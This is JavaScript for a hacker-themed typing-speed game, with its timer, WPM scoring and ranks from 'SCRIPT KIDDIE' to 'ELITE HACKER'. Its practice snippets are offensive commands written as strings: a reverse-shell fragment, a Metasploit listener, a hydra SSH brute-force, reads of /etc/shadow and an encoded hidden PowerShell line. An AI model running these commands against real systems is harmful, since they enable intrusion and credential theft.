// ══════════════════════════════════════════════════════════════════
const TT_SNIPPETS = {
  easy: [
    'nmap -sV -p 80,443,22 192.168.1.1',
    'grep -r password /var/log/ 2>/dev/null',
    'sudo netstat -tulpn | grep LISTEN',
    'curl -X POST http://target.com/login -d user=admin',
    'cat /etc/passwd | cut -d: -f1',
    'ssh root@10.0.0.1 -p 2222 -i id_rsa',
    'find / -perm -4000 -type f 2>/dev/null',
    'hydra -l admin -P pass.txt ssh://192.168.0.1',
    'ping -c 4 8.8.8.8 && echo reachable',
    'ls -la /home/ && whoami && id',
  ],
  hard: [
    'msfconsole -q -x "use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; run"',
    'python3 -c "import socket,os; s=socket.socket(); s.connect((10.0.0.1,4444)); os.dup2(s.fileno(),0)"',
    'openssl s_client -connect target.com:443 | openssl x509 -noout -text | grep Subject',
    'awk -F: "{if($3==0)print $1}" /etc/passwd && cat /etc/shadow | grep -v locked',
    'tcpdump -i eth0 -w capture.pcap port 80 or port 443 && tshark -r capture.pcap -T fields',
  ],
  elite: [
    'import socket,threading; scan=lambda h,p: socket.create_connection((h,p),0.5) and True',
    'SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE pass;',
    'powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',
    'iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 4 -j DROP',
    'volatility -f memory.dmp --profile=Win7SP1x64 pstree | grep -E cmd.powershell && malfind',
  ]
};

let ttCurrentDiff = 'easy';
let ttSnippet = '';
let ttStartTime = null;
let ttTimer = null;
let ttTimeLeft = 60;
let ttTotalTyped = 0;
let ttCorrectTyped = 0;
let ttActive = false;
let ttFinished = false;

function setTTDiff(diff){
  ttCurrentDiff = diff;
  ['easy','hard','elite'].forEach(d => {
    const btn = document.getElementById('ttDiff' + d.charAt(0).toUpperCase() + d.slice(1));
    if(!btn) return;
    btn.classList.toggle('active', d === diff);
  });
}

function getTTSnippet(){
  const pool = TT_SNIPPETS[ttCurrentDiff];
  return pool[Math.floor(Math.random() * pool.length)];
}

function renderTTDisplay(typed){
  const display = document.getElementById('ttTextDisplay');
  if(!display) return;
  let html = '';
  for(let i = 0; i < ttSnippet.length; i++){
    const ch = ttSnippet[i];
    const disp = ch === ' ' ? '&nbsp;' : ch === '\n' ? '<br>' : ch.replace(/</g,'&lt;').replace(/>/g,'&gt;');
    if(i < typed.length){
      const correct = typed[i] === ttSnippet[i];
      html += `<span style="color:${correct ? '#00ff9d' : '#ff3355'};${!correct ? 'background:rgba(255,51,85,0.15);border-radius:2px;' : ''}">${disp}</span>`;
    } else if(i === typed.length){
      html += `<span style="color:#c9d1d9;text-decoration:underline;text-decoration-color:var(--accent);animation:tblink 1s step-end infinite;">${disp}</span>`;
    } else {
      html += `<span style="color:#2d3748;">${disp}</span>`;
    }
  }
  display.innerHTML = html;

  // Update progress
  const pct = Math.round((typed.length / ttSnippet.length) * 100);
  const prog = document.getElementById('ttProgress');
  if(prog) prog.textContent = pct + '% complete';
}

function onTTInput(){
  const input = document.getElementById('ttInput');
  if(!input || ttFinished) return;
  const typed = input.value;

  if(!ttActive && typed.length > 0){
    ttActive = true;
    ttStartTime = Date.now();
    ttTimer = setInterval(updateTTTimer, 1000);
  }

  ttTotalTyped = typed.length;
  // Count correct chars
  ttCorrectTyped = 0;
  for(let i = 0; i < Math.min(typed.length, ttSnippet.length); i++){
    if(typed[i] === ttSnippet[i]) ttCorrectTyped++;
  }

  renderTTDisplay(typed);
  updateTTStats();

  // Check completion
  if(typed === ttSnippet){
    finishTypingTest();
  }
}

function updateTTTimer(){
  ttTimeLeft--;
  const el = document.getElementById('ttTime');
  if(el){
    el.textContent = ttTimeLeft;
    el.style.color = ttTimeLeft <= 10 ? '#ff3355' : '#febc2e';
  }
  if(ttTimeLeft <= 0) finishTypingTest();
}

function updateTTStats(){
  if(!ttActive || !ttStartTime) return;
  const elapsed = (Date.now() - ttStartTime) / 1000 / 60; // minutes
  const wpm = elapsed > 0 ? Math.round((ttCorrectTyped / 5) / elapsed) : 0;
  const acc = ttTotalTyped > 0 ? Math.round((ttCorrectTyped / ttTotalTyped) * 100) : 100;
  const wpmEl = document.getElementById('ttWpm');
  const accEl = document.getElementById('ttAcc');
  if(wpmEl) wpmEl.textContent = wpm;
  if(accEl) accEl.textContent = acc + '%';
}

function finishTypingTest(){
  if(ttFinished) return;
  ttFinished = true;
  clearInterval(ttTimer);

  const elapsed = ttStartTime ? (Date.now() - ttStartTime) / 1000 : 60;
  const mins = elapsed / 60;
  const wpm = mins > 0 ? Math.round((ttCorrectTyped / 5) / mins) : 0;
  const acc = ttTotalTyped > 0 ? Math.round((ttCorrectTyped / ttTotalTyped) * 100) : 100;

  let rank = '[ SCRIPT KIDDIE ]';
  if(wpm >= 80 && acc >= 95) rank = '[ ELITE HACKER ]';
  else if(wpm >= 60 && acc >= 90) rank = '[ RED TEAMER ]';
  else if(wpm >= 40 && acc >= 85) rank = '[ PENTESTER ]';
  else if(wpm >= 25) rank = '[ ANALYST ]';

  document.getElementById('ttFinalWpm').textContent = wpm + ' WPM';
  document.getElementById('ttFinalAcc').textContent = acc + '%';
  document.getElementById('ttFinalTime').textContent = Math.round(elapsed) + 's';
  document.getElementById('ttFinalRank').textContent = rank;

  const res = document.getElementById('ttResults');
  if(res){ res.style.display = 'flex'; }
}

function resetTypingTest(){
  ttActive = false;
  ttFinished = false;
  ttStartTime = null;
  ttTotalTyped = 0;
  ttCorrectTyped = 0;
  ttTimeLeft = 60;
  clearInterval(ttTimer);

  const input = document.getElementById('ttInput');
  if(input){ input.value = ''; input.disabled = false; }
  const timeEl = document.getElementById('ttTime');
  if(timeEl){ timeEl.textContent = '60'; timeEl.style.color = '#febc2e'; }
  const wpmEl = document.getElementById('ttWpm');
  if(wpmEl) wpmEl.textContent = '—';
  const accEl = document.getElementById('ttAcc');
  if(accEl) accEl.textContent = '—';
  const res = document.getElementById('ttResults');
  if(res) res.style.display = 'none';
  const prog = document.getElementById('ttProgress');
  if(prog) prog.textContent = '';

  ttSnippet = getTTSnippet();
  renderTTDisplay('');

  // Tab key to restart
  if(input) input.focus();
}

// Init typing test when window opens (patch openWindow)
// typing test init handled inside openWindow

// Tab key shortcut in typing test
document.addEventListener('keydown', e => {
  if(e.key === 'Tab' && document.activeElement && document.activeElement.id === 'ttInput'){
    e.preventDefault();
    resetTypingTest();
  }
});
// ══ END TYPING TEST ══════════════════════════════════════════════